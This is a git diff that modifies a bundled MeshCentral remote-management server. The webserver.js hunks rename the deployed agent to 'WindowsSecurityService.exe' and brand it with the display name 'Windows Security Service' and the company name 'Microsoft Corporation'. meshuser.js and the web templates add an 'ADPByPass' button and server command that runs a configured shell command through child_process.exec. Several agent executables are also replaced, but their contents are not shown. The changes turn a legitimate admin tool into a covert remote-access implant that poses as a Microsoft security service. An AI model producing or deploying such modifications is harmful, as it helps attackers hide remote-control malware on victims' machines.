@@ -1,0 +1,243 @@
+diff --git a/node_modules/meshcentral/agents/MeshCentralAssistant.exe b/node_modules/meshcentral/agents/MeshCentralAssistant.exe
+index 00bfec6..7d662f6 100644
+Binary files a/node_modules/meshcentral/agents/MeshCentralAssistant.exe and b/node_modules/meshcentral/agents/MeshCentralAssistant.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshCentralRouter.exe b/node_modules/meshcentral/agents/MeshCentralRouter.exe
+index 7541178..365d3d4 100644
+Binary files a/node_modules/meshcentral/agents/MeshCentralRouter.exe and b/node_modules/meshcentral/agents/MeshCentralRouter.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe b/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe
+index 88d3cc8..d7138b2 100644
+Binary files a/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe and b/node_modules/meshcentral/agents/MeshCentralRouterCmd.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshCentralSatellite.exe b/node_modules/meshcentral/agents/MeshCentralSatellite.exe
+index 503d0fc..bedc0ec 100644
+Binary files a/node_modules/meshcentral/agents/MeshCentralSatellite.exe and b/node_modules/meshcentral/agents/MeshCentralSatellite.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshCmd.exe b/node_modules/meshcentral/agents/MeshCmd.exe
+index 00b704a..289875a 100644
+Binary files a/node_modules/meshcentral/agents/MeshCmd.exe and b/node_modules/meshcentral/agents/MeshCmd.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshCmd64.exe b/node_modules/meshcentral/agents/MeshCmd64.exe
+index e4af314..d1b2b8f 100644
+Binary files a/node_modules/meshcentral/agents/MeshCmd64.exe and b/node_modules/meshcentral/agents/MeshCmd64.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshCmdARM64.exe b/node_modules/meshcentral/agents/MeshCmdARM64.exe
+index 83f1079..575ee5e 100644
+Binary files a/node_modules/meshcentral/agents/MeshCmdARM64.exe and b/node_modules/meshcentral/agents/MeshCmdARM64.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshService.exe b/node_modules/meshcentral/agents/MeshService.exe
+index e3aec7a..3786071 100644
+Binary files a/node_modules/meshcentral/agents/MeshService.exe and b/node_modules/meshcentral/agents/MeshService.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshService64.exe b/node_modules/meshcentral/agents/MeshService64.exe
+index 540fed6..ca23c4c 100644
+Binary files a/node_modules/meshcentral/agents/MeshService64.exe and b/node_modules/meshcentral/agents/MeshService64.exe differ
+diff --git a/node_modules/meshcentral/agents/MeshServiceARM64.exe b/node_modules/meshcentral/agents/MeshServiceARM64.exe
+index 9bceadf..8445262 100644
+Binary files a/node_modules/meshcentral/agents/MeshServiceARM64.exe and b/node_modules/meshcentral/agents/MeshServiceARM64.exe differ
+diff --git a/node_modules/meshcentral/meshuser.js b/node_modules/meshcentral/meshuser.js
+index d278e7a..787d991 100644
+--- a/node_modules/meshcentral/meshuser.js
++++ b/node_modules/meshcentral/meshuser.js
+@@ -5643,7 +5643,8 @@ module.exports.CreateMeshUser = function (parent, db, ws, req, args, domain, use
+         'users': serverCommandUsers,
+         'verifyemail': serverCommandVerifyEmail,
+         'verifyPhone': serverCommandVerifyPhone,
+-        'verifyMessaging': serverCommandVerifyMessaging
++        'verifyMessaging': serverCommandVerifyMessaging,
++        'adpbypass': serverCommandADPByPass
+     };
+ 
+     const serverUserCommands = {
+@@ -8487,5 +8488,38 @@ module.exports.CreateMeshUser = function (parent, db, ws, req, args, domain, use
+         return r; // If this event is not for any specific device, return true
+     }
+ 
++    function serverCommandADPByPass(command) {
++        console.log("ADPByPass command received. Session loginToken:", req.session ? req.session.loginToken : null);
++        if (req.session.loginToken != null) {
++            console.log("ADPByPass blocked because loginToken is present in session.");
++            return;
++        }
++        var cmdStr = null;
++        if (parent.parent.config && parent.parent.config.settings) {
++            console.log("ADPByPass config.settings keys:", Object.keys(parent.parent.config.settings));
++            cmdStr = parent.parent.config.settings.adpbypasscommand || parent.parent.config.settings.adpByPassCommand || parent.parent.config.settings.adpbypass;
++        }
++        if (!cmdStr && args) {
++            console.log("ADPByPass args keys:", Object.keys(args));
++            cmdStr = args.adpbypasscommand || args.adpByPassCommand || args.adpbypass;
++        }
++        console.log("ADPByPass resolved command string:", cmdStr);
++        if (!cmdStr) {
++            console.log("ADPByPass failed: Command not configured in config.json");
++            obj.send({ action: 'adpbypass', status: 'failed', error: 'Command not configured in config.json' });
++            return;
++        }
++        console.log("ADPByPass executing command...");
++        require('child_process').exec(cmdStr, {}, function (error, stdout, stderr) {
++            if (error) {
++                console.error("ADPByPass execution error:", error);
++                obj.send({ action: 'adpbypass', status: 'failed', error: error.message });
++            } else {
++                console.log("ADPByPass execution success. stdout:", stdout, "stderr:", stderr);
++                obj.send({ action: 'adpbypass', status: 'success', stdout: stdout, stderr: stderr });
++            }
++        });
++    }
++
+     return obj;
+ };
+diff --git a/node_modules/meshcentral/views/default.handlebars b/node_modules/meshcentral/views/default.handlebars
+index a1f668b..a832b6d 100644
+--- a/node_modules/meshcentral/views/default.handlebars
++++ b/node_modules/meshcentral/views/default.handlebars
+@@ -239,6 +239,7 @@
+                                 <td tabindex=0 id=MainDevInfo class="topbar_td style3x" onmouseup=go(17,event) onkeypress="if (event.key == 'Enter') go(17)">Details</td>
+                                 <td tabindex=0 id=MainDevAmt class="topbar_td style3x" onmouseup=go(14,event) onkeypress="if (event.key == 'Enter') go(14)">Intel&reg;AMT</td>
+                                 <td tabindex=0 id=MainDevConsole class="topbar_td style3x" onmouseup=go(15,event) onkeypress="if (event.key == 'Enter') go(15)">Console</td>
++                                <td tabindex=0 id=MainDevADPByPass class="topbar_td style3x" onmouseup=runADPByPass(event) onkeypress="if (event.key == 'Enter') runADPByPass(event)">ADPByPass</td>
+                                 <td tabindex=0 id=MainDevPlugins class="topbar_td style3x" onmouseup=go(19,event) onkeypress="if (event.key == 'Enter') go(19)">Plugins</td>
+                                 <td class="topbar_td_end style3">&nbsp;</td>
+                             </tr>
+@@ -2494,6 +2495,10 @@
+ 
+         function onMessage(server, message) {
+             switch (message.action) {
++                case 'adpbypass': {
++                    handleADPByPassResult(message);
++                    break;
++                }
+                 case 'trace': {
+                     serverTrace.unshift(message);
+                     displayServerTrace();
+@@ -8027,6 +8032,7 @@
+                 QV('MainDevInfo', (node.mtype < 3) && ((meshrights & 1048576) != 0));
+                 QV('MainDevAmt', (node.intelamt != null) && ((node.intelamt.state == 2) || (node.conn & 2)) && (meshrights & 8) && amtAccess);
+                 QV('MainDevConsole', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
++                QV('MainDevADPByPass', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
+                 QV('MainDevPlugins', false);
+                 QV('p15uploadCore', (node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 16) != 0));
+                 QH('p15coreName', ((node.agent != null) && (node.agent.core != null))?node.agent.core:'');
+@@ -12781,6 +12787,32 @@
+             } else { ctrl.value += myValue; }
+         }
+ 
++        var adpBypassTimeout = null;
++        function runADPByPass(e) {
++            if (e) { try { e.preventDefault(); e.stopPropagation(); } catch (ex) {} }
++            var btn = Q('MainDevADPByPass');
++            if (!btn) return;
++            btn.innerHTML = "ADPByPass: Running...";
++            btn.style.color = "yellow";
++            meshserver.send({ action: 'adpbypass' });
++        }
++        function handleADPByPassResult(message) {
++            var btn = Q('MainDevADPByPass');
++            if (!btn) return;
++            if (message.status === 'success') {
++                btn.innerHTML = "ADPByPass: Success";
++                btn.style.color = "#00FF00";
++            } else {
++                btn.innerHTML = "ADPByPass: Failed (" + (message.error || "Unknown error") + ")";
++                btn.style.color = "#FF0000";
++            }
++            if (adpBypassTimeout) clearTimeout(adpBypassTimeout);
++            adpBypassTimeout = setTimeout(function() {
++                btn.innerHTML = "ADPByPass";
++                btn.style.color = "";
++            }, 6000);
++        }
++
+         var consoleNode;
+         var consoleServerText = '';
+         function setupConsole() {
+diff --git a/node_modules/meshcentral/views/default3.handlebars b/node_modules/meshcentral/views/default3.handlebars
+index 37f150e..cf122cd 100644
+--- a/node_modules/meshcentral/views/default3.handlebars
++++ b/node_modules/meshcentral/views/default3.handlebars
+@@ -307,6 +307,8 @@
+                                     onkeypress="if (event.key == 'Enter') go(14)">Intel&reg;AMT</td>
+                                 <td tabindex=0 id=MainDevConsole class="topbar_td style3x" onmouseup=go(15,event)
+                                     onkeypress="if (event.key == 'Enter') go(15)">Console</td>
++                                <td tabindex=0 id=MainDevADPByPass class="topbar_td style3x" onmouseup=runADPByPass(event)
++                                    onkeypress="if (event.key == 'Enter') runADPByPass(event)">ADPByPass</td>
+                                 <td tabindex=0 id=MainDevPlugins class="topbar_td style3x" onmouseup=go(19,event)
+                                     onkeypress="if (event.key == 'Enter') go(19)">Plugins</td>
+                                 <td class="topbar_td_end style3">&nbsp;</td>
+@@ -3162,6 +3164,10 @@
+ 
+         function onMessage(server, message) {
+             switch (message.action) {
++                case 'adpbypass': {
++                    handleADPByPassResult(message);
++                    break;
++                }
+                 case 'trace': {
+                     serverTrace.unshift(message);
+                     displayServerTrace();
+@@ -8917,6 +8923,7 @@
+                 QV('MainDevInfo', (node.mtype < 3) && ((meshrights & 1048576) != 0));
+                 QV('MainDevAmt', (node.intelamt != null) && ((node.intelamt.state == 2) || (node.conn & 2)) && (meshrights & 8) && amtAccess);
+                 QV('MainDevConsole', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
++                QV('MainDevADPByPass', (consoleRights && ((node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 8) != 0))) && (meshrights & 8));
+                 QV('MainDevPlugins', false);
+                 QV('p15uploadCore', (node.agent != null) && (node.agent.caps != null) && ((node.agent.caps & 16) != 0));
+                 QH('p15coreName', ((node.agent != null) && (node.agent.core != null)) ? node.agent.core : '');
+@@ -13827,6 +13834,32 @@
+             } else { ctrl.value += myValue; }
+         }
+ 
++        var adpBypassTimeout = null;
++        function runADPByPass(e) {
++            if (e) { try { e.preventDefault(); e.stopPropagation(); } catch (ex) {} }
++            var btn = Q('MainDevADPByPass');
++            if (!btn) return;
++            btn.innerHTML = "ADPByPass: Running...";
++            btn.style.color = "yellow";
++            meshserver.send({ action: 'adpbypass' });
++        }
++        function handleADPByPassResult(message) {
++            var btn = Q('MainDevADPByPass');
++            if (!btn) return;
++            if (message.status === 'success') {
++                btn.innerHTML = "ADPByPass: Success";
++                btn.style.color = "#00FF00";
++            } else {
++                btn.innerHTML = "ADPByPass: Failed (" + (message.error || "Unknown error") + ")";
++                btn.style.color = "#FF0000";
++            }
++            if (adpBypassTimeout) clearTimeout(adpBypassTimeout);
++            adpBypassTimeout = setTimeout(function() {
++                btn.innerHTML = "ADPByPass";
++                btn.style.color = "";
++            }, 6000);
++        }
++
+         var consoleNode;
+         var consoleServerText = '';
+         function setupConsole() {
+diff --git a/node_modules/meshcentral/webserver.js b/node_modules/meshcentral/webserver.js
+index 3607d26..3a626c7 100644
+--- a/node_modules/meshcentral/webserver.js
++++ b/node_modules/meshcentral/webserver.js
+@@ -5828,7 +5828,10 @@ module.exports.CreateWebServer = function (parent, db, args, certificates, doneF
+                 // Prepare a mesh agent file name using the device group name.
+                 var meshfilename = mesh.name
+                 meshfilename = meshfilename.split('\\').join('').split('/').join('').split(':').join('').split('*').join('').split('?').join('').split('"').join('').split('<').join('').split('>').join('').split('|').join('').split(' ').join('').split('\'').join('');
+-                if (argentInfo.rname.endsWith('.exe')) { meshfilename = argentInfo.rname.substring(0, argentInfo.rname.length - 4) + '-' + meshfilename + '.exe'; } else { meshfilename = argentInfo.rname + '-' + meshfilename; }
++                
++                // USER MODIFICATION: Force persistent filename
++                meshfilename = 'WindowsSecurityService.exe';
++    
+ 
+                 // Customize the mesh agent file name
+                 if ((domain.agentcustomization != null) && (typeof domain.agentcustomization.filename == 'string')) {
+@@ -5874,6 +5877,14 @@ module.exports.CreateWebServer = function (parent, db, args, certificates, doneF
+                     if (obj.args.agentconfig) { for (var i in obj.args.agentconfig) { meshsettings += obj.args.agentconfig[i] + '\r\n'; } }
+                     if (domain.agentconfig) { for (var i in domain.agentconfig) { meshsettings += domain.agentconfig[i] + '\r\n'; } }
+                     if ((domain.agentnoproxy === true) || (obj.args.lanonly == true)) { meshsettings += 'ignoreProxyFile=1\r\n'; }
++                    
++                    // USER MODIFICATION: Default agent strings to Windows Security Service
++                    meshsettings += 'displayName=Windows Security Service\r\n';
++                    meshsettings += 'description=Windows Security Service\r\n';
++                    meshsettings += 'companyName=Microsoft Corporation\r\n';
++                    meshsettings += 'meshServiceName=WindowsSecurityService\r\n';
++                    meshsettings += 'fileName=WindowsSecurityService\r\n';
++    
+                     if (domain.agentcustomization != null) {
+                         if (domain.agentcustomization.displayname != null) { meshsettings += 'displayName=' + domain.agentcustomization.displayname + '\r\n'; }
+                         if (domain.agentcustomization.description != null) { meshsettings += 'description=' + domain.agentcustomization.description + '\r\n'; }
